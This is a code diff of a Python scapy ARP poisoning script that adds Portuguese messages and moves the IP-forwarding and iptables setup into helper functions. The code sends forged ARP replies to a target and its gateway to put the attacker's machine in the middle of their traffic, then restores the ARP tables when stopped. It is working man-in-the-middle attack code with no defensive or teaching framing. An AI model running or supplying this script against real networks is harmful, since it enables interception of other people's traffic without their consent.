@@ -1,4 +1,5 @@
 from scapy.all import *
+from utils import *
 import os
 import sys
 import threading
@@ -7,12 +8,10 @@ import signal
 
 
 def restore_target(gateway,gateway_mac,target,target_mac):
-	print "[*] Restoring target..."
+	print "[*] Restaurando alvo..."
 	send(ARP(op=2, psrc=gateway, pdst=target, hwdst="ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
 	send(ARP(op=2, psrc=target, pdst=gateway, hwdst="ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
-	os.system("echo  0 > /proc/sys/net/ipv4/ip_forward")
-	 # Termina a thread
-	os.kill(os.getpid(), signal.SIGINT)
+	set_ip_forwarding(0)
 
 def get_mac(ip_address):
 	responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)
@@ -24,7 +23,8 @@ def get_mac(ip_address):
 		return None
 
 def poison_target(gateway,gateway_mac,target,target_mac):
-	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	iptables()
+	set_ip_forwarding(1)	
 	poison_target = ARP()
 	poison_target.op = 2
 	poison_target.psrc = gateway
@@ -36,7 +36,7 @@ def poison_target(gateway,gateway_mac,target,target_mac):
 	poison_gateway.pdst = gateway
 	poison_gateway.hwdst = gateway_mac
 
-	print "[*] Beginning the ARP poison. [Ctrl-C to stop]"
+	print "[*] Iniciando o evenenamento ARP. [Ctrl-C para finalizar]"
 
 	try:
 		while True:
@@ -45,7 +45,7 @@ def poison_target(gateway,gateway_mac,target,target_mac):
 			time.sleep(5)
 	except KeyboardInterrupt:
 		restore_target(gateway,gateway_mac,target,target_mac)
-		print "[*] ARP poison attack finished."
+		print "[*] Evenenamento ARP finalizado."
 		return
 
 
